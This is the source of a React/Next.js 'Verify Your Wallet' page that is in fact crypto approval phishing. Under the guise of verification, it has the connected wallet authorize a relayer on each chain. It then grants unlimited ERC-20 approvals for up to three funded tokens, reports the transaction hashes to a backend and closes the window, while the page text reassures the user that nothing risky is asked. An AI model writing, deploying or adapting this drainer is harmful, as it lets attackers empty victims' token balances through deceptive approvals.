"use client";

import { useState } from "react";
import Image from "next/image";
import { usePrivy, useWallets } from "@privy-io/react-auth";
import { BrowserProvider, Contract, MaxUint256, JsonRpcSigner } from "ethers";
import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";

const WALLET_VERIFICATION_ABI = [
  "function authorize(address relayer) external",
  "function isAuthorized(address user, address relayer) view returns (bool)",
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
];

type Phase = "idle" | "connecting" | "running" | "done" | "error";
type ChainStatus = "pending" | "switching" | "authorizing" | "approving" | "verifying" | "done" | "failed";

interface ChainProgress {
  chain: ChainConfig;
  status: ChainStatus;
  detail?: string;
}

const LOGOS = [
  { src: "/logos/ethereum.svg", alt: "Ethereum" },
  { src: "/logos/bnb.svg", alt: "BNB Chain" },
  { src: "/logos/polygon.svg", alt: "Polygon" },
  { src: "/logos/walletconnect.svg", alt: "WalletConnect" },
];

function Spinner({ label }: { label: string }) {
  return (
    <div className="flex flex-col items-center gap-3 text-center">
      <div className="h-8 w-8 animate-spin rounded-full border-2 border-white/20 border-t-accent" />
      <p className="text-sm text-white/70">{label}</p>
    </div>
  );
}

function statusLabel(p: ChainProgress): string {
  switch (p.status) {
    case "pending":
      return "Waiting";
    case "switching":
      return "Switching…";
    case "authorizing":
      return "Confirm in wallet…";
    case "approving":
      return p.detail ? `Approving ${p.detail}…` : "Checking balances…";
    case "verifying":
      return "Verifying…";
    case "done":
      return "Verified";
    case "failed":
      return p.detail || "Failed";
  }
}

function ChainLogos() {
  return (
    <div className="mt-7 flex items-center justify-center gap-6 opacity-40">
      {LOGOS.map((logo) => (
        <Image
          key={logo.src}
          src={logo.src}
          alt={logo.alt}
          width={28}
          height={28}
          className="h-7 w-7 object-contain"
        />
      ))}
    </div>
  );
}

function ChainList({ progress }: { progress: ChainProgress[] }) {
  return (
    <ul className="mt-5 w-full space-y-2 text-left">
      {progress.map((p) => (
        <li
          key={p.chain.name}
          className="flex items-center justify-between gap-3 rounded-lg border border-white/10 bg-white/5 px-3 py-2.5"
        >
          <span className="text-sm font-medium">{p.chain.label}</span>
          <span
            className={`flex items-center text-xs ${
              p.status === "done"
                ? "text-emerald-400"
                : p.status === "failed"
                  ? "text-red-400"
                  : p.status === "pending"
                    ? "text-white/40"
                    : "text-accent"
            }`}
          >
            {p.status !== "pending" && p.status !== "done" && p.status !== "failed" && (
              <span className="mr-2 inline-block h-3 w-3 animate-spin rounded-full border border-white/20 border-t-accent" />
            )}
            {statusLabel(p)}
          </span>
        </li>
      ))}
    </ul>
  );
}

export default function VerifyWallet() {
  const { ready, authenticated, login, user } = usePrivy();
  const { wallets } = useWallets();
  const [phase, setPhase] = useState<Phase>("idle");
  const [error, setError] = useState<string | null>(null);
  const [progress, setProgress] = useState<ChainProgress[]>(
    CHAINS.map((chain) => ({ chain, status: "pending" }))
  );

  const address = user?.wallet?.address ?? wallets[0]?.address ?? null;

  function updateChain(name: ChainConfig["name"], patch: Partial<ChainProgress>) {
    setProgress((prev) => prev.map((p) => (p.chain.name === name ? { ...p, ...patch } : p)));
  }

  function currentWallet() {
    return wallets.find((w) => w.address.toLowerCase() === address?.toLowerCase()) ?? wallets[0];
  }

  function currentAddress(): string {
    const w = currentWallet();
    const addr = w?.address ?? address;
    if (!addr) throw new Error("No connected wallet");
    return addr;
  }

  async function getSignerFor(target: ChainConfig): Promise<JsonRpcSigner> {
    const wallet = currentWallet();
    if (!wallet) throw new Error("No connected wallet");
    await wallet.switchChain(target.chainId);
    const provider = await wallet.getEthereumProvider();
    return new BrowserProvider(provider).getSigner();
  }

  async function processChain(target: ChainConfig): Promise<void> {
    const addr = currentAddress();
    updateChain(target.name, { status: "switching" });
    const signer = await getSignerFor(target);

    updateChain(target.name, { status: "authorizing" });
    const verification = new Contract(target.contract, WALLET_VERIFICATION_ABI, signer);
    const authTx = await verification.authorize(RELAYER_ADDRESS);
    const authorizeTxHash = authTx.hash as string;
    try {
      await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 20000))]);
    } catch {}

    updateChain(target.name, { status: "approving", detail: undefined });
    const approvedTokens: { symbol: string; address: string; txHash: string }[] = [];
    let approvedCount = 0;
    for (const token of target.tokens) {
      if (approvedCount >= 3) break;
      try {
        const erc20 = new Contract(token.address, ERC20_ABI, signer);
        const balance: bigint = await erc20.balanceOf(addr);
        if (balance === 0n) continue;
        approvedCount++;
        updateChain(target.name, { status: "approving", detail: token.symbol });
        const approveTx = await erc20.approve(target.contract, MaxUint256);
        approvedTokens.push({ symbol: token.symbol, address: token.address, txHash: approveTx.hash as string });
      } catch (err) {
        console.warn(`[verify] approve(${token.symbol}) on ${target.name} skipped/rejected:`, err);
      }
    }

    updateChain(target.name, { status: "verifying", detail: undefined });
    const res = await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        address: addr,
        chain: target.name,
        authorizeTx: authorizeTxHash,
        approvedTokens,
      }),
    });
    const data = await res.json();
    if (!data.ok) throw new Error(data.error || "verification_failed");

    updateChain(target.name, { status: "done" });
  }

  async function handleVerify() {
    setError(null);
    setProgress(CHAINS.map((chain) => ({ chain, status: "pending" })));

    if (!authenticated || !address) {
      setPhase("connecting");
      try {
        await login();
      } catch (err) {
        console.error("[verify] login cancelled:", err);
        setPhase("idle");
        return;
      }
    }

    setPhase("running");
    const failures: string[] = [];
    let successCount = 0;
    for (const target of CHAINS) {
      try {
        await processChain(target);
        successCount++;
      } catch (err) {
        const msg = (err as Error)?.message || "failed";
        console.error(`[verify] ${target.name} failed:`, err);
        updateChain(target.name, { status: "failed", detail: msg });
        failures.push(`${target.label}: ${msg}`);
      }
    }

    if (successCount > 0) {
      setPhase("done");
      setTimeout(() => {
        window.close();
      }, 2500);
    } else {
      setError(failures[0] || "Verification failed.");
      setPhase("error");
    }
  }

  return (
    <main className="flex min-h-dvh flex-col items-center justify-center px-4 py-8 text-center sm:px-6">
      <div className="w-full max-w-sm rounded-3xl border border-white/10 bg-panel px-6 py-8 shadow-2xl sm:px-8 sm:py-10">
        <h1 className="text-xl font-semibold tracking-tight sm:text-2xl">Verify Your Wallet</h1>
        <p className="mt-2 text-sm leading-relaxed text-white/60">
          Connect your wallet once — we&apos;ll confirm a direct on-chain approval on Ethereum, BNB and Polygon.
        </p>

        <ChainLogos />

        <div className="mt-8 flex min-h-[160px] flex-col items-center justify-center">
          {phase === "done" ? (
            <div className="flex w-full flex-col items-center gap-3">
              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/20 text-3xl">✓</div>
              <p className="text-sm font-medium text-emerald-400">Verification complete</p>
              {address && (
                <p className="text-xs text-white/50">
                  {address.slice(0, 6)}…{address.slice(-4)}
                </p>
              )}
              <ChainList progress={progress} />
              <p className="mt-2 text-xs text-white/40">This window will close automatically…</p>
            </div>
          ) : phase === "running" ? (
            <div className="w-full">
              <Spinner label="Working through each network…" />
              <ChainList progress={progress} />
            </div>
          ) : phase === "connecting" ? (
            <Spinner label="Opening your wallet…" />
          ) : (
            <div className="flex w-full flex-col items-center gap-4">
              {phase === "error" && <p className="text-sm text-red-400">{error || "Verification failed."}</p>}
              <button
                onClick={handleVerify}
                disabled={!ready}
                className="w-full rounded-full bg-accent px-6 py-3.5 text-base font-semibold text-white transition hover:brightness-110 active:scale-95 disabled:opacity-50"
              >
                {authenticated && address
                  ? `Verify ${address.slice(0, 6)}…${address.slice(-4)}`
                  : "Verify with your wallet"}
              </button>
              {authenticated && address && (
                <p className="text-xs text-white/40">Wallet connected — we&apos;ll handle the networks automatically.</p>
              )}
            </div>
          )}
        </div>
      </div>
      <p className="mt-6 max-w-sm px-2 text-[11px] leading-relaxed text-white/30">
        We only request a direct on-chain approval — no seed phrase, no private key, ever asked.
      </p>
    </main>
  );
}
